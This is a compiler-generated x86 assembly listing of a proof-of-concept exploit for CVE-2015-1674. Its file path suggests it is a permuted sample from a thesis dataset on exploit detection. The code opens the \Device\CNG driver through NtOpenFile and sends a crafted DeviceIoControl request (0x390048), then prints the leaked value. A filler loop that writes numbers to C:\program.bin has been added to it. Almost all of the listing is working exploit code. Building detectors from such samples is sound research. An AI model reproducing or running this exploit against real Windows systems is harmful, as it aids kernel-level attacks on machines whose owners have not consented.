; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674_fuffa.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_main
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__DeviceIoControl@32:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	__imp__LoadLibraryA@4:PROC
EXTRN	_exit:PROC
EXTRN	_RtlInitUnicodeString@8:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_fclose:PROC
EXTRN	_fopen:PROC
EXTRN	_fwrite:PROC
EXTRN	_getchar:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98720 DB	'ntdll.dll', 00H
	ORG $+2
$SG98721 DB	'NtOpenFile', 00H
	ORG $+1
$SG98724 DB	'wb', 00H
	ORG $+1
$SG98725 DB	'C:\program.bin', 00H
	ORG $+1
$SG98726 DB	'Error! opening file', 00H
$SG98727 DB	'\', 00H, 'D', 00H, 'e', 00H, 'v', 00H, 'i', 00H, 'c', 00H
	DB	'e', 00H, '\', 00H, 'C', 00H, 'N', 00H, 'G', 00H, 00H, 00H
$SG98730 DB	'File successfully opened.', 0aH, 00H
	ORG $+1
$SG98731 DB	'File could not be opened.', 0aH, 00H
	ORG $+1
$SG98734 DB	'[*]Send IOCTL fail!', 0aH, 00H
	ORG $+3
$SG98735 DB	'[*]Error Code:%d', 0aH, 00H
	ORG $+2
$SG98736 DB	'[*]0x%08x', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_iostatusblock$ = -92					; size = 8
_filename$ = -84					; size = 8
_obja$ = -76						; size = 24
_bRet$ = -52						; size = 4
_dwCnt$ = -48						; size = 4
_stat$ = -44						; size = 4
_hModule$ = -40						; size = 4
_NtOpenFileStruct$ = -36				; size = 4
_hCNG$ = -32						; size = 4
_dwBuffer$ = -28					; size = 4
_fptr$ = -24						; size = 4
_n$ = -20						; size = 4
_num$ = -16						; size = 12
__$ArrayPad$ = -4					; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_37052_cve_id_CVE-2015-1674_fuffa.c
; Line 17
	push	ebp
	mov	ebp, esp
	sub	esp, 92					; 0000005cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 22
	push	OFFSET $SG98720
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hModule$[ebp], eax
; Line 23
	push	OFFSET $SG98721
	mov	eax, DWORD PTR _hModule$[ebp]
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtOpenFileStruct$[ebp], eax
; Line 24
	cmp	DWORD PTR _NtOpenFileStruct$[ebp], 0
	jne	SHORT $LN5@main
; Line 25
	push	-1
	call	_exit
$LN5@main:
; Line 31
	push	OFFSET $SG98724
	push	OFFSET $SG98725
	call	_fopen
	add	esp, 8
	mov	DWORD PTR _fptr$[ebp], eax
	cmp	DWORD PTR _fptr$[ebp], 0
	jne	SHORT $LN6@main
; Line 32
	push	OFFSET $SG98726
	call	_printf
	add	esp, 4
; Line 35
	push	1
	call	_exit
$LN6@main:
; Line 38
	mov	DWORD PTR _n$[ebp], 1
	jmp	SHORT $LN4@main
$LN2@main:
	mov	ecx, DWORD PTR _n$[ebp]
	add	ecx, 1
	mov	DWORD PTR _n$[ebp], ecx
$LN4@main:
	cmp	DWORD PTR _n$[ebp], 5
	jge	SHORT $LN3@main
; Line 40
	mov	edx, DWORD PTR _n$[ebp]
	mov	DWORD PTR _num$[ebp], edx
; Line 41
	imul	eax, DWORD PTR _n$[ebp], 5
	mov	DWORD PTR _num$[ebp+4], eax
; Line 42
	imul	ecx, DWORD PTR _n$[ebp], 5
	add	ecx, 1
	mov	DWORD PTR _num$[ebp+8], ecx
; Line 43
	mov	edx, DWORD PTR _fptr$[ebp]
	push	edx
	push	1
	push	12					; 0000000cH
	lea	eax, DWORD PTR _num$[ebp]
	push	eax
	call	_fwrite
	add	esp, 16					; 00000010H
; Line 44
	jmp	SHORT $LN2@main
$LN3@main:
; Line 45
	mov	ecx, DWORD PTR _fptr$[ebp]
	push	ecx
	call	_fclose
	add	esp, 4
; Line 49
	push	OFFSET $SG98727
	lea	edx, DWORD PTR _filename$[ebp]
	push	edx
	call	_RtlInitUnicodeString@8
; Line 53
	mov	DWORD PTR _obja$[ebp+12], 64		; 00000040H
; Line 54
	lea	eax, DWORD PTR _filename$[ebp]
	mov	DWORD PTR _obja$[ebp+8], eax
; Line 55
	mov	DWORD PTR _obja$[ebp], 24		; 00000018H
; Line 56
	mov	DWORD PTR _obja$[ebp+4], 0
; Line 57
	mov	DWORD PTR _obja$[ebp+16], 0
; Line 58
	mov	DWORD PTR _obja$[ebp+20], 0
; Line 61
	mov	DWORD PTR _hCNG$[ebp], 0
; Line 62
	push	32					; 00000020H
	push	7
	lea	ecx, DWORD PTR _iostatusblock$[ebp]
	push	ecx
	lea	edx, DWORD PTR _obja$[ebp]
	push	edx
	push	1048577					; 00100001H
	lea	eax, DWORD PTR _hCNG$[ebp]
	push	eax
	call	DWORD PTR _NtOpenFileStruct$[ebp]
	mov	DWORD PTR _stat$[ebp], eax
; Line 63
	cmp	DWORD PTR _stat$[ebp], 0
	jl	SHORT $LN7@main
; Line 64
	push	OFFSET $SG98730
	call	_printf
	add	esp, 4
; Line 65
	jmp	SHORT $LN8@main
$LN7@main:
; Line 67
	push	OFFSET $SG98731
	call	_printf
	add	esp, 4
; Line 68
	or	eax, -1
	jmp	SHORT $LN11@main
$LN8@main:
; Line 70
	mov	DWORD PTR _dwBuffer$[ebp], 0
; Line 71
	mov	DWORD PTR _dwCnt$[ebp], 0
; Line 72
	push	0
	lea	ecx, DWORD PTR _dwCnt$[ebp]
	push	ecx
	push	4
	lea	edx, DWORD PTR _dwBuffer$[ebp]
	push	edx
	push	4
	lea	eax, DWORD PTR _dwBuffer$[ebp]
	push	eax
	push	3735624					; 00390048H
	mov	ecx, DWORD PTR _hCNG$[ebp]
	push	ecx
	call	DWORD PTR __imp__DeviceIoControl@32
	mov	DWORD PTR _bRet$[ebp], eax
; Line 73
	cmp	DWORD PTR _bRet$[ebp], 0
	jne	SHORT $LN9@main
; Line 75
	push	OFFSET $SG98734
	call	_printf
	add	esp, 4
; Line 76
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98735
	call	_printf
	add	esp, 8
; Line 77
	jmp	SHORT $LN10@main
$LN9@main:
; Line 80
	mov	edx, DWORD PTR _dwBuffer$[ebp]
	push	edx
	push	OFFSET $SG98736
	call	_printf
	add	esp, 8
$LN10@main:
; Line 82
	mov	eax, DWORD PTR _hCNG$[ebp]
	push	eax
	call	DWORD PTR __imp__CloseHandle@4
; Line 83
	call	_getchar
; Line 84
	xor	eax, eax
$LN11@main:
; Line 85
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
